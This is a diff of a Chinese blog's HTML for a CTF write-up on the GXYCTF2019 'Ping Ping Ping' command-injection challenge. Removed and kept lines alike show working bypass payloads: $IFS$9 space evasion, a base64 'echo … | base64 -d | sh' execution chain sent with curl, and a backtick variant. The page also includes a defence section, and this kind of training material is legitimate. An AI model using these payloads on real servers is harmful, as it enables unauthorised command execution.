-<td><code>bash</code>、<code>flag</code></td>
-</tr>
-<tr>
-<td>正则特点</td>
-<td><code>flag</code> 不要求连续，f、l、a、g <strong>按顺序</strong>出现就命中</td>
-</tr>
-</tbody></table>
-<div class="note danger"><p>第 4 条最阴：<code>.*f.*l.*a.*g.*</code> 不要求 <code>flag</code> 连续，只要 f、l、a、g <strong>按顺序</strong>出现就算命中。这一点直接决定了后面很多“聪明写法”会失败。</p>
-</div>
-
-<h3 id="1-5-逐个试绕过"><a href="#1-5-逐个试绕过" class="headerlink" title="1.5 逐个试绕过"></a>1.5 逐个试绕过</h3><p>先明确目标命令是 <code>cat flag.php</code>，然后分别解决“空格”和“flag”两关。</p>
-<table>
-<thead>
-<tr>
-<th>尝试</th>
-<th>结果</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>cat$IFS$9flag.php</code></td>
-<td><mark class="label danger">失败</mark> 原始串里就有 <code>flag</code>，中招</td>
-</tr>
-<tr>
-<td><code>cat$IFS$9fla?.php</code></td>
-<td><mark class="label danger">失败</mark> <code>?</code> 在黑名单</td>
-</tr>
-<tr>
-<td><code>cat$IFS$9fla*g.php</code></td>
-<td><mark class="label danger">失败</mark> <code>*</code> 在黑名单</td>
-</tr>
-<tr>
-<td><code>cat$IFS$9fla\g.php</code></td>
-<td><mark class="label danger">失败</mark> <code>\</code> 在黑名单</td>
-</tr>
-<tr>
-<td><code>cat$IFS$9$&#123;...&#125;</code></td>
-<td><mark class="label danger">失败</mark> <code>&#123; &#125;</code> 在黑名单</td>
-</tr>
-<tr>
-<td><code>a=f;b=lag;cat$IFS$9$a$b.php</code></td>
-<td><mark class="label danger">失败</mark> <code>a=f;b=lag</code> 里按顺序出现 f、l、a、g，依然命中正则</td>
-</tr>
-<tr>
-<td><code>cat$IFS$9`ls` </code></td>
-<td><mark class="label warning">思路可用</mark> 会把目录下所有文件都打印出来（见 1.7）</td>
-</tr>
-</tbody></table>
-<p>到这里结论很清楚了：<strong>逐个字符做文章，绕不过顺序敏感的正则。</strong> 换一个维度——<strong>不传明文，传编码。</strong></p>
-<h3 id="1-6-最终-payload：base64-整条命令"><a href="#1-6-最终-payload：base64-整条命令" class="headerlink" title="1.6 最终 payload：base64 整条命令"></a>1.6 最终 payload：base64 整条命令</h3><p>把要执行的命令整体编码：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">printf</span> <span class="string">&#x27;cat flag.php&#x27;</span> | <span class="built_in">base64</span></span><br><span class="line">Y2F0IGZsYWcucGhw</span><br></pre></td></tr></table></figure>
-
-<p>得到 <code>Y2F0IGZsYWcucGhw</code>。检查一下：里面没有空格，没有黑名单符号，也没有按顺序出现的 f、l、a、g，所有检查都能过。</p>
-<p>再拼一条“解码并执行”的链路：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &lt;b64&gt;  ──►  base64 -d  ──►  sh</span><br><span class="line">输出密文          解码成命令         执行命令</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>组件</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>echo Y2F0...</code></td>
-<td>输出密文</td>
-</tr>
-<tr>
-<td><code>base64 -d</code></td>
-<td>解码回 <code>cat flag.php</code></td>
-</tr>
-<tr>
-<td><code>| sh</code></td>
-<td>让 shell 从标准输入读取并执行这条命令</td>
-</tr>
-</tbody></table>
-<p>把空格换成 <code>$IFS$9</code>，接在 ping 后面：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</span><br></pre></td></tr></table></figure>
-
-<p>服务器实际执行的命令是：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 4 127.0.0.1; <span class="built_in">echo</span> Y2F0IGZsYWcucGhw | <span class="built_in">base64</span> -d | sh</span><br></pre></td></tr></table></figure>
-
-<div class="note warning"><p>注意 <code>echo$IFS$9Y2F0...</code> 里 <code>$9</code> 的作用：如果没有 <code>$9</code>，shell 会把 <code>$IFSY2F0IGZsYWcucGhw</code> 整个当成变量名，展开成空，密文就丢了。</p>
-</div>
-
-<p>用 curl 发请求（URL 用<strong>单引号</strong>包住，否则本地的 shell 会先把 <code>$IFS</code> 展开成空）：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://target/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>如果 URL 需要显式编码，<code>;</code> 写成 <code>%3B</code>，<code>$</code> 写成 <code>%24</code>，<code>|</code> 写成 <code>%7C</code>：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%3Becho%24IFS%249Y2F0IGZsYWcucGhw%7Cbase64%24IFS%249-d%7Csh</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-7-拿到-flag"><a href="#1-7-拿到-flag" class="headerlink" title="1.7 拿到 flag"></a>1.7 拿到 flag</h3><p>返回结果里，ping 的输出后面跟着 <code>flag.php</code> 的源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;CTF2&#123;f7f9783e-54fa-4b75-a358-57b5b95b1e6f&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>完整 flag：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF2&#123;f7f9783e-54fa-4b75-a358-57b5b95b1e6f&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>注：不同平台复刻这道题时，flag 内容会不一样，以自己靶场里读到的为准。</p>
-</blockquote>
-<div class="note info"><p><strong>延伸思路（未在本题实测）</strong></p>
-<p>本题只禁了 <code>bash</code>，没禁反引号。理论上可以写：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>
-
-<p><code>ls</code> 的输出是 <code>flag.php</code> 和 <code>index.php</code> 两行，命令替换后会被拆成两个参数，等价于 <code>cat flag.php index.php</code>。这样请求里完全不出现 <code>flag</code>。缺点是会把 <code>index.php</code> 也打印出来，输出更长；而且是否按行拆分取决于 shell 的 IFS 行为，换了环境未必成立。相比之下，base64 方案更稳定、更通用。</p>
-</div>
-
-<h2 id="2-完整流程速查表"><a href="#2-完整流程速查表" class="headerlink" title="2. 完整流程速查表"></a>2. 完整流程速查表</h2><table>
+<h2 id="完整流程速查表"><a href="#完整流程速查表" class="headerlink" title="完整流程速查表"></a>完整流程速查表</h2><table>
 <thead>
 <tr>
 <th>步骤</th>
@@ -678,7 +524,7 @@
 <div class="note default"><p><strong>常用小抄</strong></p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php  →  Y2F0IGZsYWcucGhw</span><br></pre></td></tr></table></figure></div>
 
-<h2 id="3-新手常见问题"><a href="#3-新手常见问题" class="headerlink" title="3. 新手常见问题"></a>3. 新手常见问题</h2><details class="note info"><summary><p><strong>Q1：URL 里的 <code>;</code>、<code>|</code>、<code>$</code> 需要编码吗？</strong></p>
+<h2 id="新手常见问题"><a href="#新手常见问题" class="headerlink" title="新手常见问题"></a>新手常见问题</h2><details class="note info"><summary><p><strong>Q1：URL 里的 <code>;</code>、<code>|</code>、<code>$</code> 需要编码吗？</strong></p>
 </summary>
 <p>浏览器地址栏通常会自动编码，但用 curl、Burp 时建议显式处理：<code>;</code>→<code>%3B</code>、<code>|</code>→<code>%7C</code>、<code>$</code>→<code>%24</code>、空格→<code>%20</code>。用 curl 的 <code>--data-urlencode</code> 最省心：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">&#x27;http://target/&#x27;</span> --data-urlencode <span class="string">&#x27;ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh&#x27;</span></span><br></pre></td></tr></table></figure>
@@ -732,7 +578,7 @@
 
 </details>
 
-<h2 id="4-顺手聊聊怎么防"><a href="#4-顺手聊聊怎么防" class="headerlink" title="4. 顺手聊聊怎么防"></a>4. 顺手聊聊怎么防</h2><p>命令注入最难防的地方在于：黑名单永远有遗漏。真正靠谱的做法是不让用户输入进入 shell。</p>
+<h2 id="顺手聊聊怎么防"><a href="#顺手聊聊怎么防" class="headerlink" title="顺手聊聊怎么防"></a>顺手聊聊怎么防</h2><p>命令注入最难防的地方在于：黑名单永远有遗漏。真正靠谱的做法是不让用户输入进入 shell。</p>
 <table>
 <thead>
 <tr>
@@ -781,19 +627,6 @@
 <div class="note success"><p><strong>一条原则</strong>：用户输入可以是参数，但永远不该成为命令的一部分。黑名单只是补丁，白名单和“不过 shell”才是正解。</p>
 </div>
 
-<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>这道题虽然只有一关 ping，但把命令注入的完整套路都串了一遍：</p>
-<ul>
-<li><strong>注入点</strong>：参数被拼进 <code>shell_exec(&quot;ping -c 4 &quot; . $ip)</code>；</li>
-<li><strong>入口</strong>：<code>;</code> 不在黑名单，一句话就能执行任意命令；</li>
-<li><strong>第一关空格</strong>：<code>$IFS</code> 是 shell 自带的“空格别名”，<code>$9</code> 用来切断变量名；</li>
-<li><strong>第二关关键字</strong>：顺序敏感的正则让字母拆分失效，base64 把整条命令编码，从“字符层面”跳出过滤；</li>
-<li><strong>执行链</strong>：<code>echo &lt;b64&gt; | base64 -d | sh</code> 是绕过关键字过滤的经典组合拳。</li>
-</ul>
-<blockquote>
-<p>通用套路可以记成一句话：</p>
-<p><strong>找注入点 → 确认分隔符 → 摸黑名单 → 找等价写法 → 编码兜底</strong></p>
-</blockquote>
-<p>最后再强调一遍：这些技巧只适合在授权靶场里练习。真实项目里，防住它的办法只有一个——<strong>别让用户输入进入 shell。</strong></p>
 
     </div>
 
@@ -805,20 +638,24 @@
           <div class="post-tags">
               <a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" rel="tag"># 命令注入</a>
               <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag"># 命令执行</a>
+              <a href="/tags/IFS/" rel="tag"># $IFS</a>
               <a href="/tags/%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/" rel="tag"># 空格绕过</a>
               <a href="/tags/base64-%E7%BC%96%E7%A0%81/" rel="tag"># base64 编码</a>
-              <a href="/tags/GXYCTF/" rel="tag"># GXYCTF</a>
+              <a href="/tags/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/" rel="tag"># 入门基础</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2026/10/24/web-ctf-upload/" rel="prev" title="Web 文件上传实战：ACTF2020 与 极客大挑战 2019 Upload 详解">
-                  <i class="fa fa-angle-left"></i> Web 文件上传实战：ACTF2020 与 极客大挑战 2019 Upload 详解
+                <a href="/2026/10/24/web-ctf-upload-geek2019/" rel="prev" title="[极客大挑战 2019] Upload：GIF89a 与 PHP 短标签绕过">
+                  <i class="fa fa-angle-left"></i> [极客大挑战 2019] Upload：GIF89a 与 PHP 短标签绕过
                 </a>
             </div>
             <div class="post-nav-item">
+                <a href="/2026/10/25/web-ctf-command-injection-pingping/" rel="next" title="[GXYCTF2019] Ping Ping Ping：空格与关键字的双重过滤">
+                  [GXYCTF2019] Ping Ping Ping：空格与关键字的双重过滤 <i class="fa fa-angle-right"></i>
+                </a>
             </div>
           </div>
     </footer>
